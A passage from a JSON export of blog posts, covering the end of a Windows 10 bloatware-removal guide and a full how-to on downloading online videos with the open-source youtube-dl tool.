Empires, Phototastic Collage, Autodesk SketchBook, Duolingo, EclipseManager, ActiproSoftware, BioEnrollment, Windows Feedback, Xbox Game CallableUI, Xbox Identity Provider, and ContactSupport.\n\nAfter the process is complete, you can reboot your computer. That&#8217;s all there is to it. Your computer is clean of the bloatware apps.\n\nIf you want to revert the changes, run the previous commands but only use the &#8220;revert&#8221; parameter. In any event, that&#8217;s how to remove bloatware from Windows 10.\n\n [1]: http://localhost/wordpress/wp-content/uploads/2018/11/download-zip.png\n [2]: http://localhost/wordpress/wp-content/uploads/2018/11/powershell.png\n [3]: http://localhost/wordpress/wp-content/uploads/2018/11/powershell-debloat-windows-10-command.png\n",
        "tags": [
            "remove bloatware",
            "windows 10"
        ]
    },
    {
        "uri": "/how-to-download-any-video-from-any-site-for-free/",
        "title": "How to download any video from any site for free",
        "content": "You have probably discovered that downloading videos from certain websites is hard. If you try to download a video from youtube, you have to use one of the ad-infested free YouTube video downloaders. Other sites like Facebook, Instagram and Tumblr are even harder to find downloaders for. Luckily, there is a free and open-source program that will end your struggles and help you download and video from any site for free. We are going to use the program called youtube-dl\r\n\r\n1. Download youtube-dl\r\n\r\nGo to the a href=\"https://rg3.github.io/youtube-dl/\" target=\"blank\" rel=\"noopener\"homepage/a, and download YouTube-dl. Go to the download button, and select the **windows exe** hyperlink (assuming you are on Windows). YouTube-dl requires that you have Python installed. If you don&8217;t have Python installed, you can go to a href=\"https://www.python.org/downloads/\" target=\"blank\" rel=\"noopener\"this link/a to download and install the latest version.\r\n\r\n{{ ad }}\r\n\r\n2. Downloading any video online\r\n\r\nTo download any video online, first, open up youtube-dl. YouTube-dl is a command-line only program with no user interface. To open it, you can launch command prompt from the start menu and drag and drop the youtube-dl executable on the window. Or, you can open up Command Prompt in the existing folder youtube-dl is downloaded at by holding down shift, right-click and select the option to open command window here.\r\n\r\n\r\n\r\nOnce you have youtube-dl started, all you need to do is paste in a video link, and it will download the video to the current directory that CommandPrompt is pointing to. For example, I can download any youtube video by simpling pasting the URL.\r\n\r\n\r\n\r\nI can also use it to download any Instagram video.\r\n\r\n\r\n\r\nThat&8217;s it! You can use youtube-dl to easily download any video online from any site for free.\r\n\r\n [1]: http://localhost/wordpress/wp-content/uploads/2018/11/youtube-dl-command-prompt.png\r\n [2]: http://localhost/wordpress/wp-content/uploads/2018/11/youtube-dl-download-youtube-video.png\r\n [3]: http://localhost/wordpress/wp-content/uploads/2018/11/youtube-dl-download-instagram-video.png\r\n\r\n",
        "tags": [
            "download video",
            "open-source"
        ]
    }
]